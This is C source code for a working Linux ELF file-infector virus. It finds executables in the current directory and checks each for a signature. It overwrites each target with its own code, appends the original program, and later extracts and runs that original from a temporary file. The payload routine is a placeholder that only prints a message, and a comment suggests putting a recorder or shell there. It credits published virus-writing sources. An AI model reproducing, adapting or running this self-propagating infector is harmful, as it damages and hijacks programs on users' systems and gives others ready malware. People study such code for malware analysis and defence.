#include<stdio.h>
#include<fcntl.h>
#include<errno.h>
#include<unistd.h>
#include<sys/stat.h>
#include<sys/wait.h>
#include<stdlib.h>
#include<string.h>
#include<dirent.h>

#define MYSIZE 12512			//needs update when modify code ls -l -> size ^^
#define TMP ".tmp"			//tmp file to run victim in
#define SIGOFF 0x15ce			//needs update when modify code -> xxd find sig offset

int fileSize(char *file){
  int fd, fSize;
  struct stat fileStat;
  if ((fd = open(file, O_RDONLY)) < 0) perror("fileSize open R");
  if ((fstat(fd, &fileStat)) < 0) perror("fileSize fstat");
  close(fd);
  return(fileStat.st_size);
}

int runMyCode(){			//place to put virus code i.e. recorder, shell, etc
  puts("runing my code!!!!");
  return(0);
}

int getNumFiles(char *dir){		//jut count and return number of files in dir
  DIR *dd;
  int fileNum = 0;
  struct dirent *dirEn;
  if((dd = opendir(dir)) == NULL) perror("getFiles opendir");
  while((dirEn = readdir(dd)) != NULL)
    if(dirEn->d_type == DT_REG) fileNum++;
  closedir(dd);
  return(fileNum);
}

int getFiles(char *dir, char **fileList){	//get list of files in current dir(dir name, pointer to array pointer)
  DIR *dd;
  struct dirent *dirEn;
  if((dd = opendir(dir)) == NULL) perror("getFiles opendir");
  while((dirEn = readdir(dd)) != NULL)		//while not end of dir list
    if(dirEn->d_type == DT_REG){		//if regular file
      *fileList = dirEn->d_name;		//replace address of array pointer element
      fileList++;				//inc to next next entry
    }
  closedir(dd);
  return(0);
}

int isElfExe(char *file){		//check if file is elf and exe
  int fileFd;
  char *elfMagic = "\x7F\x45\x4C\x46";	//offset 0x00 "\x7FELF"
  char *elfType = "\x02\x00";		//offset 0x10 = 0x0002 = exe
  unsigned char elfHead[18];
  if ((fileFd = open(file, O_RDONLY)) < 0) perror("isElfExe open");
  if (read(fileFd, elfHead, 18) < 0) perror("isElfExe read");
  close(fileFd);
  if (memcmp(elfMagic, &elfHead[0], 4) == 0 && memcmp(elfType, &elfHead[16], 2) == 0)
    return(1);
  else return(0);
}

int isInfect(char *file, char *sig){	//check if file already infected
  int fileFd, sigLen = 4;
  unsigned char fileSig[4];
					//open file, adjust fd to signature offset
					//read in 4 bytes signature
					//compare and return 1 if equal, 0 if not equal
  if((fileFd = open(file, O_RDONLY)) < 0 ) perror("isInfect open");
  if(lseek(fileFd, SIGOFF, SEEK_SET) != SIGOFF) perror("isInfect lseek");
  if(read(fileFd, fileSig, sigLen) < 0) perror("isInfect read");
  close(fileFd);
  if(memcmp(sig, fileSig, 4) == 0)
    return(1);
  else
    return(0);
}

int runVictim(char* me){		//run victim code
  int meFd, tmpFd, victimSize;
  struct stat meStat;
  void* tmpMem;
					//locate the end of original virus
					//set the fd to that location
					//read the rest of the exe(victim) into .tmp file, and execute it
  if ((meFd = open(me, O_RDONLY)) < 0) perror("runVictim open me");
  if ((fstat(meFd, &meStat)) < 0) perror("runVictim fstat");
  if (lseek(meFd, MYSIZE, SEEK_SET) != MYSIZE) perror("runVictim lseek");
  if ((tmpMem = malloc(victimSize = meStat.st_size - MYSIZE)) == NULL) perror("runVictim malloc meMem");
  if (read(meFd, tmpMem, victimSize) < 0) perror("runVictim read");
  close(meFd);
  if ((tmpFd = open(TMP, O_WRONLY | O_CREAT)) < 0) perror("runVictim open tmp");
  if (write(tmpFd, tmpMem, victimSize) != victimSize) perror("runVictim write tmp"); 
  close(tmpFd);
  execl(TMP, NULL);			//exeute and exit process
  return(0);
}

int infect(char *me, char *vic){	//infect file(current file name, victim file name)
  int meFd, victimFd;
  char *victim = realpath(vic, NULL);	//read needs absolute or relative file name i.e ./ or /../ etc
  int  victimSize;
  void *victimMem;			//malloc returns void* mem address
  void *meMem;
  struct stat victimStat;		//return value from fstat (file status)
					//__________________________
					//|victim| --> |virus|victim|
					//---------------------------
  //open myself and dump into heap
  if ((meFd = open(me, O_RDONLY)) < 0) perror("infect open me R");
  if ((meMem = malloc(MYSIZE)) == NULL) perror("infect malloc mee");
  if (read(meFd, meMem, MYSIZE) < 0) perror("infect read me");
  close(meFd);

  //read victim and dump into heap
  if ((victimFd = open(victim, O_RDONLY)) < 0) perror("infect open victim R");
  if ((fstat(victimFd, &victimStat)) < 0) perror("infect fstat victim");
  if ((victimMem = malloc(victimSize = victimStat.st_size)) == NULL) perror("infect malloc victim");
  if (read(victimFd, victimMem, victimSize) < 0) perror("infect read victim");
  close(victimFd);

  //overwrite victim with my code
  if ((victimFd = open(victim, O_WRONLY)) < 0) perror("infect open victim W");
  if (write(victimFd, meMem, MYSIZE) < 0) perror("infect write victim");
  free(meMem);
  close(victimFd);

  //append victim with its code
  if ((victimFd = open(victim, O_WRONLY | O_APPEND)) < 0) perror("infect open victim W/A");
  if (write(victimFd, victimMem, victimSize) != victimSize) perror("infect append victim"); 
  free(victimMem);
  close(victimFd);
  return(0);
}

int main(int argc, char** argv){
  char* me = argv[0];
  char *sig = "\xde\xad\xbe\xef";		//signatured to check b4 infection, just for comparison
  char *dir = ".";
  int pid, status;
  int numFiles = getNumFiles(dir);		//get number of files in current dir
  int infectCount = 0, maxInfect = 2;		//file infection counter, so it wont infect elf
  char *fileList[numFiles];

  getFiles(dir, fileList);			//get list of file in dir
  if(fileSize(me) > MYSIZE){			//if current file size > original compile size, probably not original
    runMyCode();				//run my code
      if((pid = fork()) < 0) perror("runVictim fork");
						//fork a child for running victim code
      if(pid == 0)				//parent process run this
        runVictim(me);
      else{					//this will run if in parent
	for(int i = 0; i < numFiles; i++){	//iterate through file list
          if(isElfExe(fileList[i]) && !isInfect(fileList[i], sig) && strcmp(TMP, fileList[i])){
            infect(me, fileList[i]);		//infect any file that is elf exe, not infected and not .tmp file
            infectCount++;			//increment infection coounter
            if(infectCount == maxInfect) break;	//if met quoto, break
          }
        }
        waitpid(pid, &status, 0);		//wait till child exit
      }
  }
  else{						//code for original source virus
    for(int i = 0; i < numFiles; i++ ){		//same as infected elf exe
      if(isElfExe(fileList[i]) && !isInfect(fileList[i], sig) && strcmp(TMP, fileList[i])){
        infect(me, fileList[i]);
        infectCount++;
        if(infectCount == maxInfect) break;
      }
    }
  }
  return(0);
}
//Infection technique based on Silvio Cesare's THE NON ELF INFECTOR FILE VIRUS (FILE INFECTION)
//https://www.win.tue.nl/~aeb/linux/hh/virus/unix-viruses.txt
//thanks sample POC code from
//https://packetstormsecurity.com/files/31068/4553-invader.c.html
